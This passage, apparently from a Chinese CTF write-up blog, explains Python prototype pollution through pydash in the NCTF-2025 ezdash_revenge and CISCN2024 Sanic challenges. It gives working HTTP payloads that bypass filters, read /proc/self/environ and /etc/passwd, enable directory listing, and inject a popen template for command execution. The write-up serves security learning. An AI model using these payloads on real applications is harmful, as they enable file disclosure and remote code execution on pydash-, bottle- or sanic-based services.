+<p><a target="_blank" rel="noopener" href="https://zer0peach.github.io/images/%E5%AE%89%E6%B4%B5%E6%9D%AF%E6%A0%A1%E5%9B%AD%E8%B5%9B2023/image-20231227140904083.png"><img src="../images/image-20231227140904083.png" alt="image-20231227140904083" /></a></p>
+<h4 id="法二-直接rce"><a class="markdownIt-Anchor" href="#法二-直接rce"></a> 法二 直接rce</h4>
+<p>此外，除了配合render_template_string()实现rce以外，还有其他师傅采用了其他方法。这里贴一个p4d0rn师傅的方法<br />
+<img src="../images/1049983-20231225103125683-1568304073.png" alt="ac96bbdda6fc47f443ea66c992fe1300.png" /></p>
+<h4 id="法三-控制响应数据"><a class="markdownIt-Anchor" href="#法三-控制响应数据"></a> 法三 控制响应数据</h4>
+<p>污染Response</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">&quot;__init__&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;__globals__&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;requests&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;Response&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;text&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&#123;&#123;().__class__.__base__.__subclasses__()[154].__init__.__globals__[&#x27;popen&#x27;](&#x27;命令&#x27;).read()&#125;&#125;&quot;</span></span><br><span class="line">            <span class="punctuation">&#125;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+<h2 id="pydash原型链污染例题"><a class="markdownIt-Anchor" href="#pydash原型链污染例题"></a> Pydash原型链污染例题</h2>
+<h3 id="suctf2025su_blog"><a class="markdownIt-Anchor" href="#suctf2025su_blog"></a> [SUCTF2025]SU_blog</h3>
+<p>笔记有写</p>
+<h3 id="nctf-2025-ezdash_revenge"><a class="markdownIt-Anchor" href="#nctf-2025-ezdash_revenge"></a> NCTF-2025 ezdash_revenge</h3>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">Hints: Flag在环境变量中</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">from</span> typing <span class="keyword">import</span> <span class="type">Optional</span>  <span class="comment"># 导入Optional类型用于类型注解</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> pydash  <span class="comment"># 导入pydash库，用于对象属性操作</span></span><br><span class="line"><span class="keyword">import</span> bottle  <span class="comment"># 导入bottle库，用于Web框架功能</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># 定义禁止访问的路径属性列表，防止访问敏感属性</span></span><br><span class="line">__forbidden_path__=[<span class="string">&#x27;__annotations__&#x27;</span>, <span class="string">&#x27;__call__&#x27;</span>, <span class="string">&#x27;__class__&#x27;</span>, <span class="string">&#x27;__closure__&#x27;</span>,</span><br><span class="line">               <span class="string">&#x27;__code__&#x27;</span>, <span class="string">&#x27;__defaults__&#x27;</span>, <span class="string">&#x27;__delattr__&#x27;</span>, <span class="string">&#x27;__dict__&#x27;</span>,</span><br><span class="line">               <span class="string">&#x27;__dir__&#x27;</span>, <span class="string">&#x27;__doc__&#x27;</span>, <span class="string">&#x27;__eq__&#x27;</span>, <span class="string">&#x27;__format__&#x27;</span>,</span><br><span class="line">               <span class="string">&#x27;__ge__&#x27;</span>, <span class="string">&#x27;__get__&#x27;</span>, <span class="string">&#x27;__getattribute__&#x27;</span>,</span><br><span class="line">               <span class="string">&#x27;__gt__&#x27;</span>, <span class="string">&#x27;__hash__&#x27;</span>, <span class="string">&#x27;__init__&#x27;</span>, <span class="string">&#x27;__init_subclass__&#x27;</span>,</span><br><span class="line">               <span class="string">&#x27;__kwdefaults__&#x27;</span>, <span class="string">&#x27;__le__&#x27;</span>, <span class="string">&#x27;__lt__&#x27;</span>, <span class="string">&#x27;__module__&#x27;</span>,</span><br><span class="line">               <span class="string">&#x27;__name__&#x27;</span>, <span class="string">&#x27;__ne__&#x27;</span>, <span class="string">&#x27;__new__&#x27;</span>, <span class="string">&#x27;__qualname__&#x27;</span>,</span><br><span class="line">               <span class="string">&#x27;__reduce__&#x27;</span>, <span class="string">&#x27;__reduce_ex__&#x27;</span>, <span class="string">&#x27;__repr__&#x27;</span>, <span class="string">&#x27;__setattr__&#x27;</span>,</span><br><span class="line">               <span class="string">&#x27;__sizeof__&#x27;</span>, <span class="string">&#x27;__str__&#x27;</span>, <span class="string">&#x27;__subclasshook__&#x27;</span>, <span class="string">&#x27;__wrapped__&#x27;</span>,</span><br><span class="line">               <span class="string">&quot;Optional&quot;</span>,<span class="string">&quot;render&quot;</span>  <span class="comment"># 包含类型和函数名</span></span><br><span class="line">               ]</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 定义禁止的变量名列表</span></span><br><span class="line">__forbidden_name__=[</span><br><span class="line">    <span class="string">&quot;bottle&quot;</span>  <span class="comment"># 禁止操作bottle模块</span></span><br><span class="line">]</span><br><span class="line"><span class="comment"># 将内置函数名添加到禁止列表中</span></span><br><span class="line">__forbidden_name__.extend(<span class="built_in">dir</span>(<span class="built_in">globals</span>()[<span class="string">&quot;__builtins__&quot;</span>]))</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">setval</span>(<span class="params">name:<span class="built_in">str</span>, path:<span class="built_in">str</span>, value:<span class="built_in">str</span></span>)-&gt; <span class="type">Optional</span>[<span class="built_in">bool</span>]:</span><br><span class="line">    <span class="comment"># 检查名称是否包含双下划线（防止访问魔术方法）</span></span><br><span class="line">    <span class="keyword">if</span> name.find(<span class="string">&quot;__&quot;</span>)&gt;=<span class="number">0</span>: <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="comment"># 检查名称是否在禁止列表中</span></span><br><span class="line">    <span class="keyword">for</span> word <span class="keyword">in</span> __forbidden_name__:</span><br><span class="line">        <span class="keyword">if</span> name==word:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="comment"># 检查路径是否包含禁止的关键词</span></span><br><span class="line">    <span class="keyword">for</span> word <span class="keyword">in</span> __forbidden_path__:</span><br><span class="line">        <span class="keyword">if</span> path.find(word)&gt;=<span class="number">0</span>: <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="comment"># 从全局变量中获取对应名称的对象</span></span><br><span class="line">    obj=<span class="built_in">globals</span>()[name]</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># 使用pydash设置对象的属性值</span></span><br><span class="line">        pydash.set_(obj,path,value)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"> </span><br><span class="line"><span class="meta">@bottle.post(<span class="params"><span class="string">&#x27;/setValue&#x27;</span></span>)  </span><span class="comment"># 定义POST路由/setValue</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">set_value</span>():</span><br><span class="line">    <span class="comment"># 从查询参数获取name</span></span><br><span class="line">    name = bottle.request.query.get(<span class="string">&#x27;name&#x27;</span>)</span><br><span class="line">    <span class="comment"># 从JSON请求体获取path</span></span><br><span class="line">    path=bottle.request.json.get(<span class="string">&#x27;path&#x27;</span>)</span><br><span class="line">    <span class="comment"># 检查path是否为字符串类型</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">isinstance</span>(path,<span class="built_in">str</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;no&quot;</span></span><br><span class="line">    <span class="comment"># 限制name长度不超过6，path长度不超过32</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(name)&gt;<span class="number">6</span> <span class="keyword">or</span> <span class="built_in">len</span>(path)&gt;<span class="number">32</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;no&quot;</span></span><br><span class="line">    <span class="comment"># 从JSON请求体获取value</span></span><br><span class="line">    value=bottle.request.json.get(<span class="string">&#x27;value&#x27;</span>)</span><br><span class="line">    <span class="comment"># 调用setval函数并返回结果</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;yes&quot;</span> <span class="keyword">if</span> setval(name, path, value) <span class="keyword">else</span> <span class="string">&quot;no&quot;</span></span><br><span class="line"> </span><br><span class="line"><span class="meta">@bottle.get(<span class="params"><span class="string">&#x27;/render&#x27;</span></span>)  </span><span class="comment"># 定义GET路由/render</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">render_template</span>():</span><br><span class="line">    <span class="comment"># 从查询参数获取path</span></span><br><span class="line">    path=bottle.request.query.get(<span class="string">&#x27;path&#x27;</span>)</span><br><span class="line">    <span class="comment"># 限制path长度不超过10</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(path)&gt;<span class="number">10</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;hacker&quot;</span></span><br><span class="line">    <span class="comment"># 定义黑名单字符，防止模板注入</span></span><br><span class="line">    blacklist=[<span class="string">&quot;&#123;&quot;</span>,<span class="string">&quot;&#125;&quot;</span>,<span class="string">&quot;.&quot;</span>,<span class="string">&quot;%&quot;</span>,<span class="string">&quot;&lt;&quot;</span>,<span class="string">&quot;&gt;&quot;</span>,<span class="string">&quot;_&quot;</span>] </span><br><span class="line">    <span class="comment"># 检查path中是否包含黑名单字符</span></span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> path:</span><br><span class="line">        <span class="keyword">if</span> c <span class="keyword">in</span> blacklist:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;hacker&quot;</span></span><br><span class="line">    <span class="comment"># 使用bottle模板渲染功能（存在安全风险）</span></span><br><span class="line">    <span class="keyword">return</span> bottle.template(path)</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 启动bottle服务器，监听所有接口的8000端口</span></span><br><span class="line">bottle.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">8000</span>)</span><br></pre></td></tr></table></figure>
+<p>首先我们要去污染bottle。但是有<code>__forbidden_name__</code>的waf。所以不能直接找到bottle的object。那就只能靠别的类或方法找<code>__globals__</code>去找全局变量里的bottle object。我们尝试使用如下payload：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">POST /setValue?name=setval HTTP/1.1</span><br><span class="line">&#123;</span><br><span class="line">&quot;path&quot;: &quot;__globals__.bottle&quot;,</span><br><span class="line">&quot;value&quot;: 111</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>会报错，记得把<code>pydash.helpers.RESTRICTED_KEYS</code>也一起污染了，就可以拿到<code>__globals__</code>从而找到bottle了。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">POST /setValue?name=pydash HTTP/1.1</span><br><span class="line">&#123;</span><br><span class="line">&quot;path&quot;: &quot;helpers.RESTRICTED_KEYS&quot;,</span><br><span class="line">&quot;value&quot;: &quot;never gonna give you up&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>后面就能成功找到bottle了，但找到了bottle之后能干什么呢</p>
+<p>发现利用点就一个/render路由，渲染出path</p>
+<p>在bottle中;</p>
+<p><img src="../images/3392505-20250329124443818-510842617.png" alt="img" /></p>
+<p>TEMPLATE_PATH就是bottle在lookup查找template时的路径。它也是一个常量，定义如下：</p>
+<p><img src="../images/3392505-20250329124634331-1632933365.png" alt="img" /></p>
+<p>我们往里面加一个<code>/proc/1/</code>他就会从<code>/proc/1/</code>里找template。随后我们render的时候参数输入<code>environ</code>。它就会以为<code>/proc/1/environ</code>是一个模板，render之后给我们返回。我们就能从环境变量里看到flag</p>
+<p>payload:</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">POST /setValue?name=setval HTTP/1.1</span><br><span class="line">&#123;</span><br><span class="line">&quot;path&quot;: &quot;__globals__.bottle.TEMPLATE_PATH&quot;,</span><br><span class="line">&quot;value&quot;: [&quot;./&quot;,&quot;./views/&quot;,</span><br><span class="line">	&quot;/proc/self/&quot;</span><br><span class="line">]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>后直接render?path=environ即可</p>
+<h3 id="ciscn2024sanic重要"><a class="markdownIt-Anchor" href="#ciscn2024sanic重要"></a> [CISCN2024]Sanic（重要!!!）</h3>
+<p><img src="../images/image-20250926211957517.png" alt="image-20250926211957517" /></p>
+<p>/admin显示禁止访问，估计得取得权限</p>
+<p>/src是源码</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sanic <span class="keyword">import</span> Sanic</span><br><span class="line"><span class="keyword">from</span> sanic.response <span class="keyword">import</span> text, html</span><br><span class="line"><span class="keyword">from</span> sanic_session <span class="keyword">import</span> Session</span><br><span class="line"><span class="keyword">import</span> pydash</span><br><span class="line"><span class="comment"># pydash==5.1.2</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Pollute</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app = Sanic(__name__)</span><br><span class="line">app.static(<span class="string">&quot;/static/&quot;</span>, <span class="string">&quot;./static/&quot;</span>)</span><br><span class="line">Session(app)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">index</span>(<span class="params">request</span>):</span><br><span class="line">    <span class="keyword">return</span> html(<span class="built_in">open</span>(<span class="string">&#x27;static/index.html&#x27;</span>).read())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/login&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">login</span>(<span class="params">request</span>):</span><br><span class="line">    user = request.cookies.get(<span class="string">&quot;user&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> user.lower() == <span class="string">&#x27;adm;n&#x27;</span>:</span><br><span class="line">        request.ctx.session[<span class="string">&#x27;admin&#x27;</span>] = <span class="literal">True</span></span><br><span class="line">        <span class="keyword">return</span> text(<span class="string">&quot;login success&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> text(<span class="string">&quot;login fail&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/src&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">src</span>(<span class="params">request</span>):</span><br><span class="line">    <span class="keyword">return</span> text(<span class="built_in">open</span>(__file__).read())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/admin&quot;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">admin</span>(<span class="params">request</span>):</span><br><span class="line">    <span class="keyword">if</span> request.ctx.session.get(<span class="string">&#x27;admin&#x27;</span>) == <span class="literal">True</span>:</span><br><span class="line">        key = request.json[<span class="string">&#x27;key&#x27;</span>]</span><br><span class="line">        value = request.json[<span class="string">&#x27;value&#x27;</span>]</span><br><span class="line">        <span class="keyword">if</span> key <span class="keyword">and</span> value <span class="keyword">and</span> <span class="built_in">type</span>(key) <span class="keyword">is</span> <span class="built_in">str</span> <span class="keyword">and</span> <span class="string">&#x27;_.&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> key:</span><br><span class="line">            pollute = Pollute()</span><br><span class="line">            pydash.set_(pollute, key, value)</span><br><span class="line">            <span class="keyword">return</span> text(<span class="string">&quot;success&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> text(<span class="string">&quot;forbidden&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> text(<span class="string">&quot;forbidden&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>)</span><br></pre></td></tr></table></figure>
+<p>先是需要<code>request.ctx.session.get('admin') == True:</code></p>
+<p>但直接传<code>user=adm;n</code>肯定不行，会被截断，这里考 <strong>RFC2068 的编码规则</strong>：``sanic<code>可以通过用八进制绕过</code>cookie`</p>
+<p>原理是当接收到HTTP请求时，<code>Sanic</code> 会构造一个 <code>Request</code> 对象并在初始化时调用<code>parse_cookies()</code> 函数，该函数会对 <code>Cookie</code>解析，<strong>如果发现值被单引号包裹，则调用 <code>_unquote()</code>处理</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET /login HTTP/1.1</span><br><span class="line">Cookie: user=&quot;\141\144\155\073\156&quot;</span><br></pre></td></tr></table></figure>
+<p><img src="../images/image-20250926225753475.png" alt="image-20250926225753475" /></p>
+<p>然后就是进行污染，我们找一下利用点，看到/src是读取<code>__file__</code>，那我们污染<code>__file__</code>不就能实现任意文件读取了吗</p>
+<p>但注意waf：<code>if key and value and type(key) is str and '_.' not in key:</code></p>
+<p>现在就是考虑如何绕过<code>_.</code></p>
+<p>这里unicode肯定是不行的</p>
+<p>我们从源码来发现问题：</p>
+<p><img src="../images/image-20250927110214129.png" alt="image-20250927110214129" /></p>
+<p>跟进<code>pydash.set_()</code></p>
+<p><img src="../images/image-20250927110257976.png" alt="image-20250927110257976" /></p>
+<p>跟进update_with()，此时key变为了path</p>
+<p><img src="../images/image-20250927110341199.png" alt="image-20250927110341199" /></p>
+<p>这里处理了path</p>
+<p>跟进</p>
+<p><img src="../images/image-20250927110418601.png" alt="image-20250927110418601" /></p>
+<p>这里如果key包含<code>.</code>或者<code>[</code>，就进入<code>_to_path_token</code></p>
+<p><img src="../images/image-20250927110518783.png" alt="image-20250927110518783" /></p>
+<p><img src="../images/image-20250927110527294.png" alt="image-20250927110527294" /></p>
+<ul>
+<li>
+<p>将两个连续的反斜杠 <code>\\</code> 替换为单个反斜杠 <code>\</code></p>
+</li>
+<li>
+<p>将转义的点号 <code>\.</code> 替换为原始的点号 <code>.</code></p>
+</li>
+</ul>
+<p>那我们想构造<code>_.</code>，那不是构造<code>_\\\\.</code>就行了，先转为<code>\\.</code>,然后前面那个<code>\</code>把后面那个<code>\</code>进行转义，使它成为一个普通字符，还剩<code>\.</code>就被转成了<code>.</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;key&quot;:&quot;__class__\\\\.__init__\\\\.__globals__\\\\.__file__&quot;,&quot;value&quot;:&quot;/etc/passwd&quot;&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="../images/image-20250927112549097.png" alt="image-20250927112549097" /></p>
+<p>但遗憾的是我们不知道flag文件名，且环境变量中也没有</p>
+<p>所以真正的考点来了：<strong>利用污染的方式开启列目录功能，查看根目录下flag的名称，再进行读取</strong></p>
+<p>首先我们讲目光放在app.static这个注册路由的功能上:</p>
+<p><a target="_blank" rel="noopener" href="https://img2024.cnblogs.com/blog/3181170/202405/3181170-20240522002430162-1706653216.png"><img src="../images/3181170-20240522002430162-1706653216.png" alt="img" /></a></p>
+<p>我们跟进源码文件中查看，</p>
+<p><a target="_blank" rel="noopener" href="https://img2024.cnblogs.com/blog/3181170/202405/3181170-20240522002441107-807626283.png"><img src="../images/3181170-20240522002441107-807626283.png" alt="img" /></a></p>
+<p>看到注释中的解释</p>
+<p><a target="_blank" rel="noopener" href="https://img2024.cnblogs.com/blog/3181170/202405/3181170-20240522002457182-1281349181.png"><img src="../images/3181170-20240522002457182-1281349181.png" alt="img" /></a></p>
+<p>主要看这两个，大致意思就是directory_view为True时，会开启列目录功能，directory_handler中可以获取指定的目录</p>
+<p>我们继续跟进directory_handler:</p>
+<p><img src="../images/image-20250927113355492.png" alt="image-20250927113355492" /></p>
+<p>发现他是调用了DirectoryHandler这个类，那继续跟进这个类中</p>
+<p><img src="../images/3181170-20240522002519172-663003006.png" alt="img" /></p>
+<p>我们发现只要我们将<code>directory</code>污染为根目录，<code>directory_view</code>污染为True，就可以看到根目录的所有文件了</p>
+<p>那我们首先得获取到/static这个路由，sanic框架可以通过**app.router.name_index[‘xxxxx’]**来获取注册的路由，我们可以打印看看</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/src&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">src</span>(<span class="params">request</span>):</span><br><span class="line">    <span class="built_in">eval</span>(request.args.get(<span class="string">&#x27;gxngxngxn&#x27;</span>))</span><br><span class="line">    <span class="keyword">return</span> text(<span class="built_in">open</span>(__file__).read())</span><br></pre></td></tr></table></figure>
+<p>我们用这个调试看看</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/src?gxngxngxn=<span class="built_in">print</span>(app.router.name_index)</span><br><span class="line"></span><br><span class="line"><span class="comment">#&#123;&#x27;__mp_main__.static&#x27;: &lt;Route: name=__mp_main__.static path=static/&lt;__file_uri__:path&gt;&gt;, &#x27;__mp_main__.src&#x27;: &lt;Route: name=__mp_main__.src path=src&gt;, &#x27;__mp_main__.admin&#x27;: &lt;Route: name=__mp_main__.admin path=admin&gt;&#125;</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/src?gxngxngxn=<span class="built_in">print</span>(app.router.name_index[<span class="string">&#x27;__mp_main__.static&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment">#&lt;Route: name=__mp_main__.static path=static/&lt;__file_uri__:path&gt;&gt;</span></span><br></pre></td></tr></table></figure>
+<p>成功获取到这个路由，接下来怎么调用到DirectoryHandler里呢?</p>
+<p>我们可以全局搜索下name_index这个方法</p>
+<p><img src="../images/3181170-20240522002610729-1401803711.png" alt="img" /></p>
+<p>获取到系统调用这个路由时的状态，我们可以看它具有的属性</p>
+<p><img src="../images/3181170-20240522002632457-726007210.png" alt="img" /></p>
+<p>发现可以从handler入手，一直可以获取到DirectoryHandler中的directory和directory_view</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/src?gxngxngxn=<span class="built_in">print</span>(app.router.name_index[<span class="string">&#x27;__mp_main__.static&#x27;</span>].handler.keywords[<span class="string">&#x27;directory_handler&#x27;</span>].directory)</span><br><span class="line"><span class="comment">#E:\ctf做题脚本\web\static</span></span><br><span class="line"></span><br><span class="line">/src?gxngxngxn=<span class="built_in">print</span>(app.router.name_index[<span class="string">&#x27;__mp_main__.static&#x27;</span>].handler.keywords[<span class="string">&#x27;directory_handler&#x27;</span>].directory_view)</span><br><span class="line"><span class="comment">#False</span></span><br></pre></td></tr></table></figure>
+<p>那现在就可以进行污染了</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;key&quot;</span><span class="punctuation">:</span><span class="string">&quot;__class__\\\\.__init__\\\\.__globals__\\\\.app.router.name_index.__mp_main__\\.static.handler.keywords.directory_handler.directory_view&quot;</span><span class="punctuation">,</span><span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> True<span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+<p>注意这里不能用[]来包裹其中的索引，污染和直接调用不同，我们需要用.来连接，而<code>__mp_main.static</code>是一个整体，不能分开，我们可以用两个反斜杠来转义就够了</p>
+<p>污染成功后访问/static/</p>
+<p><img src="../images/image-20250927115622673.png" alt="image-20250927115622673" /></p>
+<p>可以看到该目录下的文件</p>
+<p>那么接下来只要污染directory就够了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;key&quot;:&quot;__class__\\\\.__init__\\\\.__globals__\\\\.app.router.name_index.__mp_main__\\.static.handler.keywords.directory_handler.directory&quot;,&quot;value&quot;:&quot;/&quot;&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="../images/image-20250927115815047.png" alt="image-20250927115815047" /></p>
+<p>但是发现这里爆500了，按gxngxngxn大佬的话来说：</p>
+<p><img src="../images/3181170-20240522002750304-712129408.png" alt="img" /></p>
+<p>不能直接将这里的值污染这一个字符串类型的，我们回到原来的地方</p>
+<p><img src="../images/3181170-20240522002758736-1126843867.png" alt="img" /></p>
+<p>可以看到directory是一个对象，而它之前的值就是由其中的<strong>parts</strong>属性决定的，但是由于这个属性是一个tuple，不能直接被污染，所以我们需要找到这个属性是如何被赋值的?</p>
